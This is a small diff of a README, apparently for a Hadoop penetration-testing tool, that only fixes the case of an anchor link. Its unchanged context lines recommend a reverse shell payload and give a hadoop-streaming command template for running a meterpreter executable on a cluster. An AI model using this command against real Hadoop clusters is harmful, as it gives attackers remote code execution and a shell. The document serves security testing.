@@ -55,7 +55,7 @@ Then when the job has terminated its execution:
   
 Executing a meterpreter
 -----------------------
-Due to the [limitations](#Limitations) inherent to Hadoop, it is recommended to **use a `reverse shell` payload.**
+Due to the [limitations](#limitations) inherent to Hadoop, it is recommended to **use a `reverse shell` payload.**
 ```
 $ hadoop jar share/hadoop/tools/lib/hadoop-streaming-2.7.3.jar -input <a non empty file on HDFS> -output <a nonexistant directory on HDFS> -mapper <your executable meterpreter path on HDFS> -reducer NONE -file <your executable meterpreter path on your local attacking environment> -background
 ```
